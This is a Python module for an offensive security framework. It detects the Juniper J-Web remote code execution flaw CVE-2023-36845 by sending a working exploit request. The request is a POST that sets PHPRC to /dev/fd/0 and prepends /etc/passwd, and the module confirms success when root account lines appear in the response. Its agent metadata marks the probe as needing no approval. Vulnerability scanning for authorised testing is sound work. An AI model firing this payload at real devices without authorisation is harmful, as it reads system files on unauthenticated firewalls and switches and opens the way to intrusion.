#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A PHP External Variable Modification vulnerability in J-Web of Juniper Networks Junos OS on EX Series and SRX ."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Juniper J-Web - Remote Code Execution Detection',
        'description': 'A PHP External Variable Modification vulnerability in J-Web of Juniper Networks Junos OS on EX Series and SRX Series allows an unauthenticated, network-based attacker to control certain environments variables to execute remote commands',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'packetstorm', 'rce', 'unauth', 'juniper', 'kev', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://vulncheck.com/blog/juniper-cve-2023-36845',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-36845',
            'https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/',
            'http://packetstormsecurity.com/files/174865/Juniper-SRX-Firewall-EX-Switch-Remote-Code-Execution.html',
            'https://supportportal.juniper.net/JSA72300',
        ],
        'cve': 'CVE-2023-36845',
    }

    def run(self):
        path = '/?PHPRC=/dev/fd/0'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='auto_prepend_file="/etc/passwd"\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('Juniper',)
        body_regexes = ('root:.*:0:0:',)
        if (any(m in body for m in body_any)) and (any(re.search(rx, body) for rx in body_regexes)):
            self.set_info(severity='critical', reason='Juniper J-Web - Remote Code Execution detected', path=path)
            return True
        return False

